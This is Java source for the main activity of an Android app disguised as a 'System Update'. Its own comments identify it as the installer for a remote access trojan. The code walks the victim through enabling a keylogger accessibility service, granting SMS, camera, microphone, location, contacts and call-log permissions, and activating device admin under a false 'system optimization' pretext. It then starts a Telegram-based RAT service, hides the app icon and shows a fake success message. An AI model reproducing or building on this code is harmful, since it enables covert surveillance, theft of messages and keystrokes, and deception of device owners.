package com.sys.updater;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private LinearLayout layout;
    private TextView tvAccStatus, tvPermStatus;
    private Button btnAcc, btnPerm, btnContinue;
    private boolean isAccEnabled = false;
    private boolean isPermsEnabled = false;
    private Typeface customFont, customFontBold;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Load Custom Fonts (Poppins)
        try {
            customFont = Typeface.createFromAsset(getAssets(), "Poppins-Regular.ttf");
            customFontBold = Typeface.createFromAsset(getAssets(), "Poppins-Bold.ttf");
        } catch (Exception e) {
            customFont = Typeface.DEFAULT;
            customFontBold = Typeface.DEFAULT_BOLD;
        }

        // Build UI
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 120, 60, 60);
        
        // Gradient Background (Dark Theme)
        GradientDrawable bg = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[] {Color.parseColor("#0F172A"), Color.parseColor("#1E293B")}
        );
        layout.setBackground(bg);
        setContentView(layout);

        // Title
        TextView tvTitle = new TextView(this);
        tvTitle.setText("System Setup");
        tvTitle.setTextSize(32);
        tvTitle.setTypeface(customFontBold);
        tvTitle.setTextColor(Color.WHITE);
        layout.addView(tvTitle);

        TextView tvDesc = new TextView(this);
        tvDesc.setText("Please complete the steps below to finish system optimization.");
        tvDesc.setTextSize(16);
        tvDesc.setTypeface(customFont);
        tvDesc.setTextColor(Color.parseColor("#94A3B8"));
        tvDesc.setPadding(0, 15, 0, 50);
        layout.addView(tvDesc);

        // ================= STEP 1: ACCESSIBILITY =================
        tvAccStatus = new TextView(this);
        tvAccStatus.setTextSize(18);
        tvAccStatus.setTypeface(customFontBold);
        layout.addView(tvAccStatus);

        btnAcc = new Button(this);
        btnAcc.setText("Enable Accessibility");
        btnAcc.setTypeface(customFontBold);
        btnAcc.setPadding(0, 25, 0, 25);
        btnAcc.setBackground(createRoundedButton(Color.parseColor("#38BDF8"))); // Sky Blue
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 15, 0, 40);
        btnAcc.setLayoutParams(params);
        
        btnAcc.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Find 'System Update' and turn it ON", Toast.LENGTH_LONG).show();
        });
        layout.addView(btnAcc);

        // ================= STEP 2: PERMISSIONS =================
        tvPermStatus = new TextView(this);
        tvPermStatus.setTextSize(18);
        tvPermStatus.setTypeface(customFontBold);
        layout.addView(tvPermStatus);

        btnPerm = new Button(this);
        btnPerm.setText("Grant Permissions");
        btnPerm.setTypeface(customFontBold);
        btnPerm.setPadding(0, 25, 0, 25);
        btnPerm.setBackground(createRoundedButton(Color.parseColor("#38BDF8")));
        btnPerm.setLayoutParams(params);
        
        btnPerm.setOnClickListener(v -> requestAppPermissions());
        layout.addView(btnPerm);

        // ================= STEP 3: CONTINUE =================
        btnContinue = new Button(this);
        btnContinue.setText("CONTINUE");
        btnContinue.setTextColor(Color.WHITE);
        btnContinue.setTypeface(customFontBold);
        btnContinue.setTextSize(18);
        btnContinue.setBackground(createRoundedButton(Color.parseColor("#10B981"))); // Emerald Green
        
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 150);
        btnParams.setMargins(0, 60, 0, 0);
        btnContinue.setLayoutParams(btnParams);
        
        btnContinue.setOnClickListener(v -> {
            if (isAccEnabled && isPermsEnabled) {
                // 1. Start RAT Service
                startForegroundService(new Intent(this, TelegramService.class));
                
                // 2. Hide App Icon (Stealth)
                getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
                
                Toast.makeText(this, "System Updated Successfully.", Toast.LENGTH_SHORT).show();
                finishAffinity();
            } else {
                Toast.makeText(this, "Please complete all steps first!", Toast.LENGTH_SHORT).show();
            }
        });
        layout.addView(btnContinue);

        // ================= DEVICE ADMIN REQUEST =================
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system optimization and updates.");
            startActivity(intent);
        }
    }

    // Helper bach n-9ado l'boutons b rounded corners
    private GradientDrawable createRoundedButton(int color) {
        GradientDrawable drawable = new GradientDrawable();
        drawable.setShape(GradientDrawable.RECTANGLE);
        drawable.setCornerRadius(30f);
        drawable.setColor(color);
        return drawable;
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkStatus();
    }

    private void checkStatus() {
        // Check Accessibility
        isAccEnabled = isAccessibilityServiceEnabled(this, KeyloggerService.class);
        if (isAccEnabled) {
            tvAccStatus.setText("Step 1: Accessibility ✓ Done");
            tvAccStatus.setTextColor(Color.parseColor("#34D399")); // Green
            btnAcc.setVisibility(View.GONE);
        } else {
            tvAccStatus.setText("Step 1: Accessibility ❌ Not Enabled");
            tvAccStatus.setTextColor(Color.parseColor("#F87171")); // Red
            btnAcc.setVisibility(View.VISIBLE);
        }

        // Check Permissions
        isPermsEnabled = checkAppPermissions();
        if (isPermsEnabled) {
            tvPermStatus.setText("Step 2: Permissions ✓ Done");
            tvPermStatus.setTextColor(Color.parseColor("#34D399"));
            btnPerm.setVisibility(View.GONE);
        } else {
            tvPermStatus.setText("Step 2: Permissions ❌ Not Granted");
            tvPermStatus.setTextColor(Color.parseColor("#F87171"));
            btnPerm.setVisibility(View.VISIBLE);
        }

        // Show Continue if both are done
        if (isAccEnabled && isPermsEnabled) {
            btnContinue.setVisibility(View.VISIBLE);
        } else {
            btnContinue.setVisibility(View.GONE);
        }
    }

    private void requestAppPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        requestPermissions(perms.toArray(new String[0]), 1);
    }

    private boolean checkAppPermissions() {
        return checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkStatus();
    }

    // Check wach l'Accessibility m-activi f Settings
    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null) return false;

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);

        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName)) return true;
        }
        return false;
    }
            }
